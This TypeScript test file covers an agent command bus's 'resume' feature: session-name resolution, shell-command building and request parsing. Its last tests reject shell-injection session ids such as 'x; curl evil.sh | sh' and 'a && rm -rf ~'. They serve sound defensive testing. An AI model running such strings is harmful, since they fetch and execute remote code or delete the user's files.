/**
 * AI-149 — `resume` reopens the SAME someone, or says it cannot.
 *
 * These pin the two decisions that make that true: which session a name resolves to, and what
 * the bus does when it resolves to nothing. Both are pure, so they are tested without a
 * filesystem; main's `resumeIdFor` only supplies candidates to `pickResume`.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { agentNamesIn, latestAgentName, pickResume, isSafeSessionId, type ResumeCandidate } from '../core/resumeTarget';
import { parseRequest, buildResumeCmd, buildSpawnCmd } from '../core/commandBus';

const rec = (name: string, sid = 's1') =>
  JSON.stringify({ type: 'agent-name', agentName: name, sessionId: sid });

test('agent-name records are read in file order', () => {
  const t = [rec('app-walker'), '{"type":"user"}', rec('aios-app')].join('\n');
  assert.deepEqual(agentNamesIn(t), ['app-walker', 'aios-app']);
});

test('a renamed session answers to its LAST name, not its first', () => {
  // 0.9.3 shipped tab rename, so one transcript can hold several names. Resolving on the first
  // would resume a session under a name it no longer has — a different someone.
  const t = [rec('app-walker'), rec('aios-app')].join('\n');
  assert.equal(latestAgentName(t), 'aios-app');
  assert.equal(latestAgentName('{"type":"user"}'), undefined);
});

test('names match case-insensitively and ignore surrounding space', () => {
  assert.equal(latestAgentName(rec('  AIOS-App  ')), 'aios-app');
  assert.equal(pickResume('AIOS-APP', [{ sessionId: 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222', mtimeMs: 1, latestName: 'aios-app' }]), 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222');
});

test('pickResume takes the NEWEST session that currently answers to the name', () => {
  const c: ResumeCandidate[] = [
    { sessionId: 'oooo1111-o1o1-4o1o-8o1o-oooo11112222', mtimeMs: 100, latestName: 'writer' },
    { sessionId: 'nnnn1111-n1n1-4n1n-8n1n-nnnn11112222', mtimeMs: 900, latestName: 'writer' },
    { sessionId: 'tttt1111-t1t1-4t1t-8t1t-tttt11112222', mtimeMs: 999, latestName: 'reviewer' },
  ];
  assert.equal(pickResume('writer', c), 'nnnn1111-n1n1-4n1n-8n1n-nnnn11112222');
});

test('a session cannot resume ITSELF', () => {
  // A session filing a resume for its own name would reopen itself — a duplicate at best.
  const c: ResumeCandidate[] = [
    { sessionId: 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222', mtimeMs: 900, latestName: 'writer' },
    { sessionId: 'dddd1111-d1d1-4d1d-8d1d-dddd11112222', mtimeMs: 100, latestName: 'writer' },
  ];
  assert.equal(pickResume('writer', c, 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222'), 'dddd1111-d1d1-4d1d-8d1d-dddd11112222');
  assert.equal(pickResume('writer', [c[0]], 'mmmm1111-m1m1-4m1m-8m1m-mmmm11112222'), undefined);
});

test('no candidate answers to the name → undefined, never a near miss', () => {
  const c: ResumeCandidate[] = [{ sessionId: 'aaaa1111-a1a1-4a1a-8a1a-aaaa11112222', mtimeMs: 1, latestName: 'writer-2' }];
  assert.equal(pickResume('writer', c), undefined);
  assert.equal(pickResume('', c), undefined);
});

test('buildResumeCmd resumes by sessionId and carries no identity flags', () => {
  const cmd = buildResumeCmd('claude', 'abc12345-1234-4123-8123-abc123456789', { prompt: "pick up where you left off" });
  assert.match(cmd, /--resume 'abc12345-1234-4123-8123-abc123456789'/);
  // --name would RE-name the session and --model would re-pin it; a resume inherits both.
  assert.ok(!cmd.includes('--name'), cmd);
  assert.ok(!cmd.includes('--model'), cmd);
});

test('buildResumeCmd quotes the prompt, and omits it when absent', () => {
  assert.match(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: "it's done" }), /'it'\\''s done'/);
  assert.equal(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'), "claude --resume 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'");
  assert.equal(buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: '   ' }), "claude --resume 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222'");
});

test('a taskFile replaces the inline prompt for both spawn and resume', () => {
  // Windows PowerShell mangles POSIX-quoted apostrophes, so every prompt spills to a file there.
  const r = buildResumeCmd('claude', 'xxxx1111-x1x1-4x1x-8x1x-xxxx11112222', { prompt: "won't survive", taskFile: '/tmp/t.md' });
  assert.ok(r.includes('/tmp/t.md'), r);
  assert.ok(!r.includes("won't survive"), r);
  assert.ok(buildSpawnCmd('claude', 'n', { task: "won't", taskFile: '/tmp/t.md' }).includes('/tmp/t.md'));
});

test("parse accepts resume and its opt-in fallback", () => {
  const r = parseRequest('{"action":"resume","name":"writer","prompt":"hi"}');
  assert.equal(r?.action, 'resume');
  assert.equal(r?.prompt, 'hi');
  assert.equal(r?.fallback, undefined, 'fallback is opt-in — absent means refuse');
  assert.equal(parseRequest('{"action":"resume","name":"w","fallback":"spawn"}')?.fallback, 'spawn');
  // Not a boolean, so a future second fallback needs no second field; unrecognised = no fallback.
  assert.equal(parseRequest('{"action":"resume","name":"w","fallback":true}')?.fallback, undefined);
  assert.equal(parseRequest('{"action":"resume","name":"w","fallback":"kill"}')?.fallback, undefined);
});

test('an ABSENT action still means spawn — contract-1 back-compat', () => {
  assert.equal(parseRequest('{"name":"w","task":"go"}')?.action, 'spawn');
  assert.equal(parseRequest('{"name":"w","action":"  "}')?.action, 'spawn');
});

test('a WRITTEN but unrecognised verb is refused, not defaulted to spawn', () => {
  // The whole point of resume is that a someone is not a something; silently spawning for a
  // typo'd verb performs exactly that substitution.
  const r = parseRequest('{"action":"resmue","name":"writer"}');
  assert.equal(r?.action, 'unknown');
  assert.equal(r?.rawAction, 'resmue', 'the dead letter has to quote what was written');
  assert.equal(parseRequest('{"action":"spawn","name":"w"}')?.rawAction, undefined);
});

test('every known verb survives a round trip, case-insensitively', () => {
  for (const v of ['spawn', 'kill', 'send', 'resume']) {
    assert.equal(parseRequest(`{"action":"${v.toUpperCase()}","name":"w","prompt":"p"}`)?.action, v);
  }
});

/* ── main-side wiring ───────────────────────────────────────────────────────────────────────
   runImmediate cannot be imported (only initCommandBus is exported), so these read the source.
   They assert SEAMS — that a path exists and disposes its request — never exact prose. */

import fs from 'node:fs';

/** runImmediate's body, with comments stripped so prose never counts as code. */
function runImmediateBody(): string {
  const src = fs.readFileSync('src/main/commandBus.ts', 'utf8')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/.*$/gm, '$1');
  const start = src.indexOf('function runImmediate');
  assert.ok(start > 0, 'runImmediate not found — this guard is reading the wrong thing');
  const end = src.indexOf('\nfunction ', start + 10);
  const body = src.slice(start, end === -1 ? undefined : end);
  // Controls: the stripper must have stripped, and must not have eaten the code.
  assert.doesNotMatch(body, /ALREADY AWAKE/, 'the comment stripper did not strip');
  assert.match(body, /req\.action === 'resume'/, 'the comment stripper ate the code');
  return body;
}

test('no path leaves runImmediate without disposing the held request', () => {
  /* THE SEAM THAT BROKE. Extracting runSpawn out of runImmediate moved cleanup ownership: the
     extracted `return`s now exit runSpawn, not runImmediate, so each early return in the caller
     has to dispose for itself and the shared tail catches the rest. A missing or doubled
     disposal leaves a request either replayed forever or silently dropped — neither of which
     the compiler can see. */
  const body = runImmediateBody();
  const disposes = (s: string) => /unlinkSync\(heldPath\)|markUndelivered\(heldPath/.test(s);
  let from = 0, seen = 0;
  for (;;) {
    const at = body.indexOf('return', from);
    if (at === -1) break;
    from = at + 6;
    if (!/^\s*[;\n]/.test(body.slice(at + 6))) continue;   // `return x` / `returns` — not an exit
    seen++;
    assert.ok(disposes(body.slice(Math.max(0, at - 420), at)),
      `a return at offset ${at} leaves runImmediate without unlinking or dead-lettering the request`);
  }
  assert.ok(seen >= 3, `expected several early exits to check, saw ${seen}`);
  // and exactly one shared tail for the branches that fall through
  assert.equal(body.match(/unlinkSync\(heldPath\)/g)?.length ?? 0, 3,
    'expected exactly three disposals: unknown-verb (via dead letter), already-awake, resumed, and one shared tail');
});

test('resume reaches the SAME launcher spawn does — one extracted function, two callers', () => {
  const body = runImmediateBody();
  assert.equal(body.match(/runSpawn\(win, heldPath, req\)/g)?.length, 2,
    'runSpawn must be called from both the default spawn path and resume\'s opt-in fallback');
});

test('a live session is revealed and SENT to — never resumed into a second process', () => {
  const body = runImmediateBody();
  const branch = body.slice(body.indexOf("req.action === 'resume'"), body.indexOf('resumeIdFor'));
  assert.match(branch, /focusByName/, 'an already-running target is revealed');
  assert.match(branch, /runSend\(/, 'and its prompt lands through the send path');
  assert.doesNotMatch(branch, /buildResumeCmd|emit\(win\(\), 'terminal'/,
    'resuming a session that is already running would create a second process for one identity');
});

test('no transcript REFUSES by default, and names the miss', () => {
  const body = runImmediateBody();
  const gate = body.slice(body.indexOf('resumeIdFor'), body.indexOf('runSpawn(win, heldPath, req)'));
  assert.match(gate, /fallback !== 'spawn'/, 'the fallback is opt-in — absent means refuse');
  assert.match(gate, /markUndelivered\(heldPath, req,[\s\S]{0,200}\$\{req\.name\}/,
    'the dead letter must name the session that could not be found, or it is not actionable');
});

test('an unrecognised verb is dead-lettered before any launcher runs', () => {
  const body = runImmediateBody();
  const at = body.indexOf("req.action === 'unknown'");
  assert.ok(at > 0 && at < body.indexOf('runSpawn('), 'the unknown-verb refusal must precede every launch');
  assert.match(body.slice(at, at + 400), /markUndelivered/);
});

test('A SESSION ID IS A FILENAME, NOT A UUID — it never reaches a shell unguarded', () => {
  /* The id is `path.basename(f, ".jsonl")` for a file in ~/.claude/projects, and it is then
     interpolated into a command a surface TYPES INTO A LIVE SHELL. "It is a UUID" describes
     where it usually comes from, not what it is: a file named `x; curl evil.sh | sh .jsonl`
     dropped in that tree would otherwise turn a resume request into arbitrary execution. The
     prompt beside it was quoted from the start; the id was not, because nobody questioned it.
     Worth the rule rather than a patch: this path runs automatically from a BUS request, and the
     bus exists so agents can drive it — so a local-write primitive becomes a shell primitive. */
  const real = '7526be1c-68b2-4ac6-b259-1efe4b2f9b02';
  assert.equal(isSafeSessionId(real), true, 'a real session id must still resume');
  for (const bad of [
    'x; curl evil.sh | sh', 'a && rm -rf ~', 'a`id`', 'a$(id)', "a'b", 'a"b', 'a b', 'a|b',
    'a\nb', 'a>b', 'a&b', '-rf', '--resume', '', 'short',
  ]) {
    assert.equal(isSafeSessionId(bad), false, `must refuse: ${JSON.stringify(bad)}`);
  }
});

test('an unsafe id is DROPPED from resolution, never sanitised into a different session', () => {
  /* Sanitising would guess which session a mangled id meant, and resuming the wrong one is the
     exact substitution this verb exists to prevent. Nothing to resume is the honest answer, and
     the caller already reports that as a dead letter. */
  const evil = 'evil; curl x | sh';
  assert.equal(pickResume('w', [{ sessionId: evil, mtimeMs: 9, latestName: 'w' }]), undefined);
  // and a safe sibling still wins rather than the whole resolution failing
  assert.equal(pickResume('w', [
    { sessionId: evil, mtimeMs: 9, latestName: 'w' },
    { sessionId: '7526be1c-68b2-4ac6-b259-1efe4b2f9b02', mtimeMs: 1, latestName: 'w' },
  ]), '7526be1c-68b2-4ac6-b259-1efe4b2f9b02');
});

test('the built command quotes the id even so — one guard is a policy, two is a boundary', () => {
  const cmd = buildResumeCmd('claude', '7526be1c-68b2-4ac6-b259-1efe4b2f9b02');
  assert.match(cmd, /--resume '7526be1c-68b2-4ac6-b259-1efe4b2f9b02'/);
  // a metacharacter that somehow got through is inert rather than executed
  assert.doesNotMatch(buildResumeCmd('claude', 'a; rm -rf ~'), /--resume a; rm/);
});
